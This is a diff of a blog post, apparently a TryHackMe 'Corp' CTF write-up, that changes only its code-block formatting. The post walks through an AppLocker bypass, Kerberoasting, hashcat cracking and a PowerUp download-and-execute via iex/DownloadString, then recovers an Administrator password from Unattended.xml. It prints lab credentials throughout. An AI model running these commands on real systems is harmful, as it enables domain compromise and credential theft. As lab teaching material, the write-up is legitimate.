@@ -35,37 +35,34 @@ Boot up the machine for the room.
 <br />
 Copy nc.exe into the local working folder.
 
-{% raw %}
-```bash
+{% capture cpnc %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ cp $(locate nc.exe) .                                                               
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cpnc %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Use PowerShell to transfer nc.exe to the victim machine.
 
-{% raw %}
-```powershell
+{% capture blockedtransfer %}
 PS C:\Users\dark\Desktop> wget http://10.4.119.29:8000/nc.exe -outfile C:\Users\dark\Desktop\nc.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=blockedtransfer %}
 
 <br />
 AppLocker should block the execution.
@@ -79,11 +76,10 @@ AppLocker should block the execution.
 <br />
 There are certain paths that are white-listed by default.  Move the binary to one of these locations.
 
-{% raw %}
-```powershell
+{% capture transferwhitelist %}
 PS C:\Users\dark\Desktop> cp .\nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=transferwhitelist %}
 
 <br />
 The binary should be able to execute now.
@@ -103,22 +99,20 @@ Due to difficulties open start, navigate directly to the PowerShell or CMD binar
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture powershellexe %}
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-```
-{% endraw %}
-{% raw %}
-```bash
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=powershellexe %}
+
+{% capture cmdexe %}
 C:\Windows\System32\cmd.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=cmdexe %}
 
 <br />
 Make sure to check the PowerShell history for the first flag.
 
-{% raw %}
-```powershell
+{% capture checkpowershellhistory %}
 PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
 PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> ls
 
@@ -145,14 +139,13 @@ cd C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
 ls
 cat .\ConsoleHost_history.txt
 PS C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=checkpowershellhistory %}
 
 <br />
 Enumerate the usernames in the Service Principal Name (SPN).
 
-{% raw %}
-```powershell
+{% capture enumspn %}
 PS C:\Users\dark\Desktop> setspn -T medin -Q */*
 Ldap Error(0x51 -- Server Down): ldap_connect
 Failed to retrieve DN for domain "medin" : 0x00000051
@@ -188,14 +181,13 @@ CN=fela,CN=Users,DC=corp,DC=local
         HTTP/fela@corp.local
 
 Existing SPN found!
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=enumspn %}
 
 <br />
 Download the kerberoasting PowerShell script.
 
-{% raw %}
-```bash
+{% capture wgetkerb %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 --inet4-only
 --2025-03-02 00:26:31--  https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
@@ -213,15 +205,17 @@ Invoke-Kerberoast.ps1                                      100%[================
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=wgetkerb %}
 
 <br />
 Run the Kerberoasting script on the victim machine.
 
-{% raw %}
-```bash
+{% capture invokepowershell %}
 C:\Windows\System32\spool\drivers\color>powershell -ep bypass;
+{% endcapture %}
+
+{% capture runkerbs %}
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
@@ -255,36 +249,42 @@ Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$08085EC8F5E1E0A8B
 SamAccountName       : fela
 DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
 ServicePrincipalName : HTTP/fela
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=invokepowershell %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=runkerbs %}
 
 <br />
 Save the hash to a sile so we can feed it into a hacker.
 
-{% raw %}
-```bash
+{% capture cathashtxt %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
-└─$ cat hash.txt                
+└─$ cat hash.txt  
+{% endcapture %}
+
+{% capture hashtxt %}
 $krb5tgs$23$*fela$corp.local$HTTP/fela*$08085EC8F5E1E0A8BF7B15EED00ABDA7$9B81BBE52C33A771966069A2D53539B9B08357539EEA773FEB83D88F6817ED90D5D79E0856260CC9DCB81A052BDE493A93D8A54D5BB808D0F7702B43793F6D00FC585D4AD986203011EFC3A1D1891B263A0DB1822A33EC859059CDFBAB7D6CB0CD84FDC669FC09A7F1568650499889E99C96571E68C31758355EB5576830331BD6F8904895C3A99ECC1EFBCB4F8E56D3D2E4B2C92E3CE809686962D4099BCB30343835E37DB9E365684DFE36AFF6DE30BF7D1A5460C1FCD0BADCCA3A1E65DF154C0180B6C5C6B5D87250165CC3FE53BB93F039D47AA2EED6B040966BB8D164D4F6C13C346AD3644F79BB4DFE05B82472C40FD4308DFD55BD72F13BE365A8AFF75AB2DA7D3E9AD19BC4AB05FBF2DAEE2E4F25720A02AD20D9B49CC39C647AF52C7A0605ADCB02C80A7B3DF3B43753F386D9A93CC3B461441BCEC6D8B46E400856991804186921F9266DA396540B0747B8511C3A623A5706FE6D31C5DF2EC043DB7D6540A5519C11C1CBD7103C9F5482C1C3342DB0A5B49AE5D388D93BA9411CC2D37360BBFA91CE7D8CFB768FC609D7F7252D5428CFCF6A5C54B9D3267D910C8E5FC1DDD7C9A1E2E61DB42915F09678F1BF4B167A8E93F561DC50B47799F86DA710AE326B0ADEB9D50C66DB1D5A630527B01219908B5C2F4AF55AE613735486F37A9F2D93028889D2DCEC228A3007227EE8D8FE04B0D8B538C44B74B4F746AA1CF7FDF85CAB81ECA0C8BEB76D1D5D4A939E4B6CC2EDA4E9DAEDBAC3C58F32431E34648A8DC5A0C8007FE348A1CC828994328794084AE9A047FDECC189858CBD3160C7D0210DF86862FADC63F41156E693352821C5C9CD0A35EF143239ABD6AE22D549066C01B0CABEDEDD29A997190587C5D87E562D4CB0385DD338CDEA7B51AA87D6FE066565861FAF5BCE37D5CCC60546B0D07C15EC58E26EE113372A18DFFAC3FC45D7AFD8DC467248C075E3398217B8BDB1EE592D8D2D4F7D09711D7F0235B9CEB121862604625428C05B31CD30469F97BE398B5732CCFD608BC5415E2191ABE37E4665AD526E574E808767843AB7072FE01FF32CA97B547250A09F03B9B2AC78CCFA38B58F5A4DF22043CB49F595D4C11185029237DEADBC8D234DF49A7F0883F56ADF7DB7D4375D580AC01B130B72A293CED47549B8D38C1035779DBFE7E185927CD2D1FAFD7D886DB73F9FB10C97D599E60CE3B294AD38E8AE7108FBD44F96551DA2C369DFB26730D22E2AE96AA697BEB6096D3F9E0B706ED39005811846B332568CB7715FD6FB6C3C56DEB3C42A8AAABEC135752D908226107607CC9DAAA3969A992DDC2D5981B713D92E5DAC98C8C634D066A938910AD0D3AB03CD59CABE8DFA52CE9D2B5CE11443E3B2C183075611BACD9D0AA3B3C0FE9AE82B6DFFAC
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=cathashtxt %}
+
+{% include codebox.html title="hash.txt" content=hashtxt %}
 
 <br />
 Use hashcat to crack the hash.
 
-{% raw %}
-```bash
+{% capture hashcathashtxt %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force --quiet     
 $krb5tgs$23$*fela$corp.local$HTTP/fela*$08085ec8f5e1e0a8bf7b15eed00abda7$9b81bbe52c33a771966069a2d53539b9b08357539eea773feb83d88f6817ed90d5d79e0856260cc9dcb81a052bde493a93d8a54d5bb808d0f7702b43793f6d00fc585d4ad986203011efc3a1d1891b263a0db1822a33ec859059cdfbab7d6cb0cd84fdc669fc09a7f1568650499889e99c96571e68c31758355eb5576830331bd6f8904895c3a99ecc1efbcb4f8e56d3d2e4b2c92e3ce809686962d4099bcb30343835e37db9e365684dfe36aff6de30bf7d1a5460c1fcd0badcca3a1e65df154c0180b6c5c6b5d87250165cc3fe53bb93f039d47aa2eed6b040966bb8d164d4f6c13c346ad3644f79bb4dfe05b82472c40fd4308dfd55bd72f13be365a8aff75ab2da7d3e9ad19bc4ab05fbf2daee2e4f25720a02ad20d9b49cc39c647af52c7a0605adcb02c80a7b3df3b43753f386d9a93cc3b461441bcec6d8b46e400856991804186921f9266da396540b0747b8511c3a623a5706fe6d31c5df2ec043db7d6540a5519c11c1cbd7103c9f5482c1c3342db0a5b49ae5d388d93ba9411cc2d37360bbfa91ce7d8cfb768fc609d7f7252d5428cfcf6a5c54b9d3267d910c8e5fc1ddd7c9a1e2e61db42915f09678f1bf4b167a8e93f561dc50b47799f86da710ae326b0adeb9d50c66db1d5a630527b01219908b5c2f4af55ae613735486f37a9f2d93028889d2dcec228a3007227ee8d8fe04b0d8b538c44b74b4f746aa1cf7fdf85cab81eca0c8beb76d1d5d4a939e4b6cc2eda4e9daedbac3c58f32431e34648a8dc5a0c8007fe348a1cc828994328794084ae9a047fdecc189858cbd3160c7d0210df86862fadc63f41156e693352821c5c9cd0a35ef143239abd6ae22d549066c01b0cabededd29a997190587c5d87e562d4cb0385dd338cdea7b51aa87d6fe066565861faf5bce37d5ccc60546b0d07c15ec58e26ee113372a18dffac3fc45d7afd8dc467248c075e3398217b8bdb1ee592d8d2d4f7d09711d7f0235b9ceb121862604625428c05b31cd30469f97be398b5732ccfd608bc5415e2191abe37e4665ad526e574e808767843ab7072fe01ff32ca97b547250a09f03b9b2ac78ccfa38b58f5a4df22043cb49f595d4c11185029237deadbc8d234df49a7f0883f56adf7db7d4375d580ac01b130b72a293ced47549b8d38c1035779dbfe7e185927cd2d1fafd7d886db73f9fb10c97d599e60ce3b294ad38e8ae7108fbd44f96551da2c369dfb26730d22e2ae96aa697beb6096d3f9e0b706ed39005811846b332568cb7715fd6fb6c3c56deb3c42a8aaabec135752d908226107607cc9daaa3969a992ddc2d5981b713d92e5dac98c8c634d066a938910ad0d3ab03cd59cabe8dfa52ce9d2b5ce11443e3b2c183075611bacd9d0aa3b3c0fe9ae82b6dffac:rubenF124
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hashcathashtxt %}
 
 <br />
 RDP into the machine as the new user that we now have creds for.
 
-{% raw %}
-```bash
+{% capture felaxfreerdp %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ xfreerdp /u:fela /p:rubenF124 /v:10.10.236.143 /dynamic-resolution +clipboard
 [00:51:17:259] [37053:37054] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
@@ -312,8 +312,8 @@ Do you trust the above certificate? (Y/T/N) Y
 [00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
 [00:51:24:845] [37053:37054] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
 [00:51:25:131] [37053:37054] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=felaxfreerdp %}
 
 <br />
 Get the first flag.
@@ -327,8 +327,7 @@ Get the first flag.
 <br />
 Download the PowerUp.ps1 PowerShell script.
 
-{% raw %}
-```bash
+{% capture downloadpowerup %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 --inet4-only
 --2025-03-02 00:55:17--  https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
@@ -346,14 +345,13 @@ PowerUp.ps1                                                100%[================
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpowerup %}
 
 <br />
 Run all of the checks from the PowerUp script.
 
-{% raw %}
-```powershell
+{% capture powerupallchecks %}
 PS C:\Windows\system32> iex(New-Object Net.WebClient).DownloadString("http://10.4.119.29:8000/PowerUp.ps1")
 PS C:\Windows\system32> Invoke-AllChecks
 
@@ -410,15 +408,17 @@ UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
 
 
 [*] Checking for encrypted application pool and virtual directory passwords...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=powerupallchecks %}
 
 <br />
 Check the unattended.xml file looking for encoded passwords.
 
-{% raw %}
-```xml
+{% capture typeunattended %}
 PS C:\Windows\system32> type C:\Windows\Panther\Unattend\Unattended.xml
+{% endcapture %}
+
+{% capture unattendedxml %}
 <AutoLogon>
     <Password>
         <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
@@ -427,25 +427,26 @@ PS C:\Windows\system32> type C:\Windows\Panther\Unattend\Unattended.xml
     <Enabled>true</Enabled>
     <Username>Administrator</Username>
 </AutoLogon>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=typeunattended %}
+
+{% include codebox.html title="unattended.xml" content=unattendedxml %}
 
 <br />
 Decode the password from the unattended.xml file.
 
-{% raw %}
-```bash
+{% capture decodepassword %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ echo 'dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=' | base64 -d
 tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=decodepassword %}
 
 <br />
 RDP into the machine as the Administrator with the password from the unattended.xml file.
 
-{% raw %}
-```bash
+{% capture xfreerdp %}
 ┌──(kali㉿kali)-[~/Documents/thm/corp]
 └─$ xfreerdp /u:Administrator /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' /v:10.10.236.143 /dynamic-resolution +clipboard
 [01:06:03:773] [44268:44269] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
@@ -455,8 +456,8 @@ RDP into the machine as the Administrator with the password from the unattended.
 [01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
 [01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
 [01:06:07:193] [44268:44269] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=xfreerdp %}
 
 <br />
 I was prompted to change the password.
